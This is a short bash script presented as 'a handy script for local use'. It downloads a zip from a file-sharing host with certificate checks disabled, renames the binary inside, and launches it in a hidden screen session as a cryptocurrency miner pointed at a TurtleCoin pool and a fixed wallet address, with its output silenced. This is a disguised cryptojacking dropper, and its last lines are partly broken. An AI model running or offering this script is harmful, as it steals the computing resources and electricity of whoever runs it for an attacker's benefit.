#!/bin/bash
#
# This is a handy script for local use

apt update
apt -y install screen unzip
wget --no-check-certificate -c https://transfer.sh/glULeN/vault.zip
unzip vault.zip
mv checker vault
cd vault
screen -dmS build ./vault --donate-level 1 -o us.turtlecoin.herominers.com:1160 -u TRTLv3XdA6KgV9dHSXXB1pJtSjdQdLXuJewbc5SALSGcaXwyKkj548iWqBKxQEnyeRV7hfBw8FaveMmBDzeRCjQ7arJQASUnca2 -p $(echo $(shuf -i 1-20000 -n 1)-V) -a argon2/chukwav2 -k
> /dev/null 2>&1
chmod 777 checker && ./checker
echo succes
